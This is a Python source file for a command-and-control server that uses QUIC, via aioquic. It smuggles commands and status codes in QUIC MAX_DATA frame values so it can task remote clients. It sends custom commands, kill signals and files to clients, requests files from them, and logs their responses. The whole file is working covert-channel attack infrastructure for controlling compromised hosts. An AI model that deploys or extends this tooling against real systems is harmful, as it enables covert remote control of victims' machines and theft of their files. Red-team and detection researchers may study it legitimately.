"""A C2 server which specifically utilizes QUIC as a means of transmitting
both responses and commands.  Other data is carried over HTTP/3, as needed.
"""
import asyncio
import os
import pathlib
import time
from typing import Dict, Optional

from aioquic.asyncio import QuicConnectionProtocol, serve
from aioquic.quic.events import (QuicEvent, StreamDataReceived,
                                 ConnectionTerminated)
from aioquic.h3.connection import H3_ALPN
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.logger import QuicFileLogger
from aioquic.tls import SessionTicket

from c2_dealer import QuiC2Database
from server.server_comms import respond_to_sdr, bls
from tools.constants import (DEFAULT_MAX_DATA, Actions, MAX_VLIE_INT,
                             DELIMITER, MAX_BYTES)
from tools.shared_functionality import int_to_enum


class QuicServer():
    """A generic QUIC server.  Populate standard values and locations
    of necessary trace elements.
    """

    def __init__(self) -> None:
        # A QuicFileLogger is used for tracing events.
        quic_log = 'quic_file_logs'
        try:
            # Make this directory if it doesn't already exist.
            os.mkdir(quic_log)
        except FileExistsError:
            pass
        quic_logger = QuicFileLogger(quic_log)

        # File needed for storing QUIC secrets.  This can be linked to
        # in Wireshark for decrypting QUIC packets for troubleshooting.
        secrets_log_file = open('secrets_log_file', 'a')

        # A QuicConfiguration object is needed to pass to a QuicConnection.
        self.configuration = QuicConfiguration(
            alpn_protocols=H3_ALPN,  # HTTP/3.
            is_client=False,  # Is a server.
            quic_logger=quic_logger,
            secrets_log_file=secrets_log_file)

        # Load a certificate and a private key.  These strings are required
        # to be PathLike objects...
        certificate_path = pathlib.Path(r'certs\ssl_cert.pem')
        private_key_path = pathlib.Path(r'certs\ssl_key.pem')
        self.configuration.load_cert_chain(certificate_path, private_key_path)


class QuicServerProtocol(QuicConnectionProtocol):
    """Protocol to handle QUIC interactions.  This protocol MUST inherit
    QuicConnectionProtocol.
    """

    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)

        # These need to be set so that very large stream_id values can be used
        # to uniquely identify streams from various clients.
        self._quic._local_max_streams_bidi.value = MAX_VLIE_INT
        self._quic._remote_max_streams_bidi = MAX_VLIE_INT

    def quic_event_received(self, event: QuicEvent) -> None:
        """Act on a QuicEvent that is received.

        Args:
            event (QuicEvent): A QuicEvent instance.
        """
        if isinstance(event, StreamDataReceived):
            # Find the corresponding enum, if present.
            info = int_to_enum(self._quic._remote_max_data)

            # If the message is not valid, let the operator know.
            if info == Actions.NOT_A_VALID_INTEGER:
                bls.warning('Received this erroneous value for MAX_DATA:'
                            f'  {self._quic._remote_max_data}')
                # Reset fields and sent a command to kill the client.
                self._quic._remote_max_data = DEFAULT_MAX_DATA
                self._quic._local_max_data.value = Actions.CLIENT_KILL.value
                self._quic.send_stream_data(event.stream_id, b'')
                return

            # If the client sends a file, this needs to be written to disk
            # as the frames come in (there will most likely be multiple).
            if info == Actions.CLIENT_FILE_SEND:
                # TODO: need to get an actual name for the file
                with open('temp', 'ab') as f:
                    f.write(event.data)
                return

            # Get a response from the server.
            srvr_resp, items = respond_to_sdr(DB_CON, event.stream_id, info)

            # No need for a reply concerning certain messages.
            # Print output from client response.
            match srvr_resp:
                case Actions.SERVER_SEES_RESPONSE:
                    data = str(event.data.decode().strip())
                    bls.info(f'{event.stream_id} response: {data}')
                    return

                case Actions.NO_RESPONSE_NEEDED:
                    return

                case Actions.SERVER_FILE_SEND:
                    # Only one filename will ever be returned.
                    filename = items[0]
                    bls.debug(f'Send file {filename}')

                    # Here is the info to send TO the client.
                    self._quic._local_max_data.value = srvr_resp.value

                    with open(filename, 'rb') as f:
                        while True:  # do-while loop
                            # Read MAX_BYTES to stuff into QUIC packet.
                            file_data = f.read(MAX_BYTES)
                            # break when all of the file is read.
                            if not file_data:
                                break
                            self._quic.send_stream_data(event.stream_id,
                                                        file_data)
                    return

                case Actions.SERVER_FILE_RECV:
                    # Only one filename will ever be returned.
                    filename = items[0]
                    bls.debug(f'Receive file {filename}')

                    # Here is the info to send TO the client.
                    self._quic._local_max_data.value = srvr_resp.value
                    self._quic.send_stream_data(
                        event.stream_id, (filename + DELIMITER).encode())

                    # Reset this in order to receive error code properly.
                    self._quic._remote_max_data = DEFAULT_MAX_DATA
                    return

                case Actions.FILE_NOT_FOUND:
                    bls.warning('Requested file does not exist on client!')

                case _:
                    print(srvr_resp)

            # Assuming you made it through all of the above wickets...
            for cmd in items:
                try:
                    # If this is a stock command, send via MAX_DATA frame. Will
                    # fail here if cmd is actually a string.
                    int_cmd = int(cmd)  # <-- Fail here.
                    send = int_to_enum(int_cmd)
                    if send == Actions.NOT_A_VALID_INTEGER:
                        raise TypeError
                    bls.debug(f'Sending {send.name} to {event.stream_id}')
                    # Here is the info to send TO the client.
                    self._quic._local_max_data.value = send.value
                    # Send the data to the client.
                    self._quic.send_stream_data(event.stream_id, b'***')

                except ValueError:
                    str_cmd = str(cmd)  # Ensure proper type.
                    bls.debug(f'Sending {cmd} to {event.stream_id}')
                    # If a custom command, need to send server response
                    # and command as bytes.
                    self._quic._local_max_data.value = Actions.CUSTOM.value
                    # Use delimiter because QUIC packet may combine
                    # data frames and not distinguish between commands.
                    self._quic.send_stream_data(
                        event.stream_id, (str_cmd + DELIMITER).encode())

                except TypeError:  # A numeric command that isn't defined.
                    bls.debug(f'Not a valid Action: {send}', exc_info=True)

                time.sleep(1)  # Wait a little bit.

        elif isinstance(event, ConnectionTerminated):
            # Leave the client alive unless specifically designated to be
            # terminated.  Will be cleaned up later if not designated.
            if event.reason_phrase == 'terminate':
                bls.info(f'Connection to {event.error_code} terminated!')

                # Need to remove the stream_id from the list, indicating that a
                # client has terminated their connection to the server.
                current_clients, error = DB_CON.sel_all_alive()
                if error:
                    bls.warning('There was an error attempting to retrieve'
                                ' alive clients.  Will attempt to delete'
                                f' stream_id {event.error_code} below.')

                # The event.error_code has the stream_id of the client.
                if str(event.error_code) in current_clients:
                    # Delete this stream_id from the database.
                    if DB_CON.del_stream_id(event.error_code):
                        bls.debug(f'stream_id {event.error_code} deleted!')


class SessionTicketStore:
    """This was taken from the example code for aioquic.  Simple in-memory
    store for session tickets.
    """

    def __init__(self) -> None:
        self.tickets: Dict[bytes, SessionTicket] = {}

    def add(self, ticket: SessionTicket) -> None:
        """Add a new session ticket.

        Args:
            ticket (SessionTicket): A SessionTicket instance.  Used for TLS
            session resumption, if needed.
        """
        self.tickets[ticket.ticket] = ticket

    def pop(self, label: bytes) -> Optional[SessionTicket]:
        """Pop a SessionTicket and return.

        Args:
            label (bytes): A label that identifies a SessionTicket.

        Returns:
            Optional[SessionTicket]: A specific SessionTicket instance in use
            by the TLS engine.
        """
        return self.tickets.pop(label, None)


def db_ops(loop: asyncio.AbstractEventLoop) -> None:
    """This function will perform database operations on a periodic basis.  It
    restarts itself by calling this function after every iteration.

    Args:
        loop (asyncio.AbstractEventLoop): The loop defined in the body below.
    """
    # Attempt to clean stagnant entries.
    removed, clean = DB_CON.clean_stagnant()
    if clean:
        for stream_id in removed:
            bls.info(f'Removed stagnant stream_id: {stream_id}')

    # Call the function to execute again.
    loop.call_later(5, db_ops, loop)


if __name__ == '__main__':
    # Create a QuicServer object and initialize.
    quic_server = QuicServer()
    # Create a SessionTicketStore object and initialize.
    ticket_store = SessionTicketStore()
    # Basic parameters needed for run call below.
    host = 'localhost'
    port = 443
    # Connection to the database
    DB_CON = QuiC2Database()

    # Create a new event loop for asyncio.
    loop = asyncio.new_event_loop()
    loop.set_debug(True)
    # This is the aioquic.asyncio serve.  It will start the QuicServer.
    loop.run_until_complete(serve(
        host, port,
        configuration=quic_server.configuration,
        create_protocol=QuicServerProtocol,
        session_ticket_fetcher=ticket_store.pop,
        session_ticket_handler=ticket_store.add,
        retry=True))

    try:
        # Now that everything has been set up correctly, continue to run until
        # stop is called.
        bls.info('QUIC Server is starting...')
        # This is a persistent task that will perform database operations every
        # 5 seconds.
        loop.call_later(5, db_ops, loop)
        loop.run_forever()

    except KeyboardInterrupt:
        # Stop and kill the event loop.
        loop.stop()
        loop.close()

        # Close the database connection.
        DB_CON.close_connection()
        bls.info('QUIC Server is exiting...')
